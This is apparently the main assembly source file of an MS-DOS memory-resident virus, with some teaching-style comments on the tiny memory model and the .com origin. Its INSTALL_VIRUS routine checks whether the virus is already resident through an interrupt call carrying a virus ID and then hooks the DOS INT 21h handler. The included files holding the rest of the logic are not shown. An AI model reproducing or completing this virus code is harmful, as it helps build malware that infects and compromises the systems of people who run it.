
.model tiny
;Tiny-model programs run only under MS-DOS. Tiny model places all data and code in a single segment.
; Therefore, the total program file size can occupy no more than 64K.
CODE_SEG SEGMENT
ASSUME CS:CODE_SEG

  
;defines where the machine code place in memory
;100H says that the machine code starts from address (offset) 100h in this segment ,For .com format the offset is always 100H
;Another example is ORG 7C00H for intel exe program format.
org 100h 



   ;for debuging..
   ;mov dl,'A' ; print 'A'
   ;mov ah,2h
   ;int 21h
START: 
jmp INSTALL_VIRUS ;go to the installation routine

include data.asm
include Macro.asm ; the macro help Routines 
include ProcRout.asm

INSTALL_VIRUS:
push cs   
pop ds 
push cs
pop es
lea si, Sstart
call Printf 
;VIRUS RESIDENCY CHECK 
mov ax, nVirusID
int nISRNumber   
cmp bx, nVirusID ;virus are installed ?
je VIRUS_ALREADY_INSTALLED
; create new dta


; INSTALL NEW ISR FOR INT 21h 
lea si,newisr
call Printf 
mov al, nISRNumber
lea si, dwOldExecISR
lea dx, NewDosISR
call HookISR    
VIRUS_ALREADY_INSTALLED:
lea si,finish
call Printf 
END_OF_CODE:
CODE_SEG ENDS
end start



